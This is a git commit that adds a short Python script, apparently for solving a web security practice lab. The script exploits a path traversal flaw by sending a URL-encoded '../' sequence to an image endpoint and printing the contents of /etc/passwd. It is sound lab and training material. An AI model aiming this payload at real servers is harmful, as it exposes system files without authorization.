7ab84eb6b73eba9a7200c6ef9d5f164c0fa53aae
Alvin Nguyen <alvinonguyen00@gmail.com>
2024-01-10 18:12:28 -0800

    File path traversal, traversal sequences stripped with superfluous URL-decode

---
+++ web-security/file-path-traversal/lab-superfluous-url-decode.py
@@ -0,0 +1,19 @@
+from ..utils import *
+from urllib.parse import urlencode, urljoin
+
+import requests
+
+
+def solve_lab(url, proxies):
+    url = urljoin(url, "/image")
+    params = { "filename": "%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd" }
+
+    print_info(f"Exploiting path traversal vulnerability by visiting \"{url}?{urlencode(params)}\"...")
+    resp = requests.get(url, proxies=proxies, verify=False, params=params)
+
+    if resp.status_code != 200:
+        print_fail("Unable to get contents of file.")
+    else:
+        print_success("GET request came back with the following response:")
+        print(resp.text)
+
